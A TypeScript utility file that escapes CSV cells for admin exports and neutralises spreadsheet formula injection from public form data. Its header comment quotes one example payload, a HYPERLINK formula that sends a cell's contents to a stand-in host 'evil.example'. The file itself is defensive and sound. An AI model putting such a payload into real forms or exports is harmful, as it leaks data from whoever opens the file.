/**
 * CSV helpers for admin exports.
 *
 * Every value in these exports originates from the public assessment and
 * enquiry forms, so it is attacker-controlled. Two separate problems follow
 * from that:
 *
 * 1. Formula injection. Excel, LibreOffice and Google Sheets evaluate a cell
 *    that begins with = + - @ (or leading whitespace before one) as a formula.
 *    A submitted name of `=HYPERLINK("https://evil.example?d="&A1,"Click")`
 *    executes the moment an admin opens the export. Prefixing a single quote
 *    makes the spreadsheet treat the cell as literal text.
 *
 * 2. Structural corruption. Wrapping a value in quotes without escaping the
 *    quotes inside it lets a name containing `"` or `,` break out of its cell
 *    and shift every subsequent column.
 */

const FORMULA_TRIGGER = /^[=+\-@]/;

/** Strips only whitespace and control characters. */
const LEADING_NOISE = /^\s+/;

/** Quotes and escapes one value for CSV, neutralising formula triggers. */
export function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);

  // Spreadsheets ignore leading whitespace when deciding whether a cell is a
  // formula, so test against the trimmed value. Only whitespace and control
  // characters are stripped here \u2014 stripping the trigger characters
  // themselves would let a value like "-2+3" through unescaped.
  const probe = raw.replace(LEADING_NOISE, "");
  const safe = FORMULA_TRIGGER.test(probe) ? `'${raw}` : raw;

  // RFC 4180: wrap in quotes, double any quote inside.
  return `"${safe.replace(/"/g, '""')}"`;
}

/** Builds a CSV document from a header row and data rows. */
export function toCsv(headers: string[], rows: unknown[][]): string {
  const lines = [headers.map(csvCell).join(","), ...rows.map((row) => row.map(csvCell).join(","))];
  // Excel is happiest with CRLF, and a UTF-8 BOM keeps non-ASCII names intact.
  return "\ufeff" + lines.join("\r\n");
}
